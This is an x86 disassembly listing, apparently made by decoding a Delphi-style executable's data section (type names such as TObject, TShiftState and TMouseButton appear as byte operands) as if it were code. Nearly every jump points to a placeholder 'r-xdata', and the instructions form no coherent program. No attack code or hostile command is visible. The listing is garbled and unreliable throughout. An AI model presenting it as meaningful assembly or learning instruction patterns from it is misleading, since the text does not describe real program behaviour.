dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
cld
inc edx
add [ eax ] al
adc [ eax ] al
nop
je r-xdata
outsb
je r-xdata
push 0x48004010
cmovno eax [ eax ]
nop
mov al 0xff
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
hlt
add al dl
test [ edx ] 0x1c
add [ ebx ] eax
or [ 0x646e4554 ] cl
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
inc esp
jb r-xdata
inc edx
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp - 0x13ffc0 ] cl
inc edx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp + 0xd40040 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x1 ] bh
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
shl dh 0x1
inc edx
add [ ecx + eax ] bl
inc ebx
add [ eax ] cl
or eax 0x646e4554
push ebx
outsb
add al 0x8
push es
hlt
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
adc [ eax ] al
jo r-xdata
add ah dh
inc edx
add [ eax ] ch
add eax [ ebx ]
or [ ecx ] dl
push esp
inc edi
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
hlt
outsb
je r-xdata
inc ebx
jpe r-xdata
enter 0x4308 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4303b4c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
enter 0x4308 0x0
adc [ eax ] dl
inc ebx
add [ eax ] al
adc [ eax ] al
fadd [ edx ]
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43053cc0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x4304b4c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add ah dh
adc [ eax ] al
jo r-xdata
inc edx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dh
cld
inc edx
add [ eax ] al
adc [ eax ] al
nop
jo r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc ebx
add [ eax ] cl
or al 0x54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp al 0x5
inc ebx
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x5fbc0040 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] al
test [ ecx ] ah
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
and al 0x4
inc ebx
add [ eax ] cl
add al ah
cdq
jo r-xdata
add [ ecx - 0x661fffbf ] al
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
push es
inc ebx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x6540040 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
dec eax
cmovno eax [ eax ]
cmp al 0x10
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
jbe r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
push es
inc ebx
add ah cl
or [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cli
lea eax [ eax ]
push esp
push es
jbe r-xdata
add [ esi + 0x5c004308 ] bh
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
dec eax
cmovno eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x8004305 ] dh
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ ebp + edi + 0x6c9c0043 ] cl
inc ebx
add [ eax + 0x3e740043 ] dl
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x3ff00043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x3cb40041 0x43
sub al 0x5b
inc ebx
add [ eax ] ch
pop ebx
inc ebx
add al bh
pop ebx
inc ebx
add al bh
inc ebx
add [ esi + eax * 2 ] bh
inc ebx
add [ eax - 0x37ffbcbb ] ah
dec esi
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ eax ] ch
pop esi
inc ebx
add ah ah
outsb
inc ebx
add [ eax - 0xfffbcb0 ] cl
push eax
inc ebx
add [ eax + 0x41 ] dh
inc ebx
add ah bl
push eax
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_430a1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
jo r-xdata
inc ebx
add [ eax + eax ] ah
add [ eax ] al
fdivr st2
inc edx
add [ eax + 0x33 ] dh
0x9b180041 0x41
insb
fwait
inc ecx
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc esp
add al ch
adc [ eax + eax - 0x1c ] eax
cmp al [ ebx ]
adc [ edx ] dl
inc esp
add [ eax + 0x3b ] al
inc ebx
add [ eax ] bl
adc al [ eax + eax + 0x60 ]
cmp eax [ ebx ]
and [ edx ] dl
inc esp
add [ eax + esi * 2 + 0x3c540043 ] dh
inc ebx
add [ esp + edi + 0x3b800043 ] dl
inc ebx
add [ edx + edx ] dh
inc esp
add [ eax ] bh
adc al [ eax + eax - 0x5c ]
cmp eax [ ebx ]
adc al 0x39
inc ebx
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
adc [ eax + eax + 0x78 ] eax
cmp al [ ebx ]
test [ ecx ] dl
inc esp
add [ eax + esi * 2 + 0x3bf00043 ] ch
inc ebx
add [ edx + edi + 0x11d40043 ] ch
add [ edx + edi ] al
inc ebx
add [ ecx + edx + 0x44 ] bl
add [ eax + 0x3a ] bh
inc ebx
add [ ecx + edx + 0x70ac0044 ] al
inc ebx
add al dh
cmp eax [ ebx ]
lodsb [ esi ]
cmp al [ ebx ]
aam 0x11
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah cl
0x70880041 0x43
add [ ebx + 0x3b180041 ] bl
inc ebx
add [ ebx + ebx * 4 ] dh
inc ecx
add ah al
cmp eax [ ebx ]
test [ edx - 0x64e7ffbf ] bl
inc ecx
add [ ebx + ebx * 4 + 0x41 ] ch
jbe r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xafcc08b
inc ebx
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
or eax [ ebx ]
push es
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
jo r-xdata
insb
inc ebp
jb r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
add [ ebx + ecx + 0x43 ] ebp
add [ ebx + 0x430bccc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
or eax [ ebx ]
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
or eax [ ebx ]
mov eax eax
int3
insb
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add al cl
or eax [ ebx ]
push es
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
dec esi
popad
insd
mov eax eax
or al 0xb
inc ebx
add [ ecx ] al
or al 0x54
inc edx
outsd
jb r-xdata
or cl [ eax ]
push esp
dec ecx
insd
jo r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x70bc0041 0x43
js r-xdata
outsd
insb
jae r-xdata
or eax 0x10020043
outsd
insb
jae r-xdata
mov eax eax
adc [ ebx + eax * 2 ] cl
outsb
je r-xdata
inc ebx
outsd
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ecx + 0x43 ] ch
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
je r-xdata
add [ ebx + esi - 0x70f7ffc0 ] al
inc ebx
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
inc ebx
add [ esi + edi * 4 - 0x421fffbd ] dl
inc ebx
add al bh
inc ebx
add [ eax ] bh
mov ah 0x43
add [ eax ] al
add [ eax ] al
jo r-xdata
add bh bh
[ eax + 0x430c ]
add [ eax - 0x4c ] bl
inc ebx
add [ eax - 0x4f ] dh
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
rcl [ eax ] 0xc
inc ebx
inc ebx
add [ edx + eax ] al
add dl [ eax ]
insb
push edi
sub [ ebx + eax * 2 ] cl
add [ ecx + eax ] bh
add al bh
or al [ ebx ]
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
add [ eax + 0x3000437a ] dl
mov [ ebx ] al
sbb al 0x82
inc ebx
add [ eax ] bl
test [ ebx ] eax
dec eax
add [ ebx ] 0xffffffc8
mov [ ebx ] al
int3
add [ eax ] al
or [ esi ] al
inc ebx
add al ah
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ edx + 0x200430d ] cl
adc [ ebx ] al
add al 0x2
inc ebx
add [ eax + edx ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc ecx
add [ esp + ebp * 2 + 0x43 ] ah
add [ eax + eax * 2 + 0x73840043 ] al
inc ebx
add [ ecx + ecx * 2 - 0x6607ffbd ] bl
inc ecx
add al ah
jno r-xdata
inc ebx
add [ eax + 0x3e ] al
inc ebx
add [ esi + edi + 0x43 ] al
add [ esi + ebp * 2 ] dh
inc ebx
add [ eax + 0x6e ] ah
inc ebx
add [ ecx + ecx * 2 + 0x3fbc0043 ] al
inc ebx
add [ eax ] dl
dec ebx
inc ebx
add [ eax - 0x63ffbcb6 ] cl
dec ebp
inc ebx
add [ eax + 0x4c ] cl
inc ebx
add [ ebp + ecx * 4 + 0x6ee40043 ] ah
inc ebx
add ah al
mov cl 0x43
add [ eax + 0x7c0043b2 ] al
lodsd [ esi ]
inc ebx
add [ edx + esi * 4 + 0x43 ] ah
add ah bh
jae r-xdata
sub_430b24
sub [ ebx ] cl
inc ebx
add [ ebx ] al
or [ edx + eax * 2 + 0x65 ] edx
jbe r-xdata
outsd
jo r-xdata
insb
inc ebx
jne r-xdata
or [ edx + 0x65 ] ah
inc edx
outsd
je r-xdata
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ecx ] ah
inc ebx
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec esp
outsd
ja r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
outsb
je r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or eax [ ebx ]
push es
add [ eax ] al
insb
inc ebp
jae r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
or eax [ ebx ]
mov eax eax
int3
insb
add [ ebx + ecx + 0x43 ] ebp
add [ ebx + 0x430bccc0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
or cl [ eax ]
push esp
dec ecx
insd
dec esi
popad
insd
mov eax eax
or al 0xb
inc ebx
add [ ecx ] al
or al 0x54
inc edx
outsd
jb r-xdata
jo r-xdata
jb r-xdata
add [ ebx ] al
add [ eax ] al
add al cl
or eax [ ebx ]
push es
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
or eax 0x10020043
outsd
insb
jae r-xdata
mov eax eax
adc [ ebx + eax * 2 ] cl
outsb
je r-xdata
inc ebx
outsd
insb
inc ebp
jb r-xdata
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebx + ecx + 0x43 ] ch
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
inc ebx
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
inc ebx
add [ esi + edi * 4 + 0x43 ] ah
add al dl
xchg [ ebx ] al
je r-xdata
pop es
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
rcl [ eax ] 0xc
inc ebx
inc ebx
add [ edx + eax ] al
add dl [ eax ]
insb
push edi
bound esp [ ebp + 0x54 ]
or eax [ ebx ]
add ecx [ edx ]
push esp
inc edx
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x70bc0041 0x43
js r-xdata
outsd
insb
jae r-xdata
sub [ ebx + eax * 2 ] cl
add [ ecx + eax ] bh
add al bh
or al [ ebx ]
mov [ ecx ] al
add [ eax ] al
imul eax [ eax ] 0x111000f
dec esi
add [ 0x15011400 ] dl
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
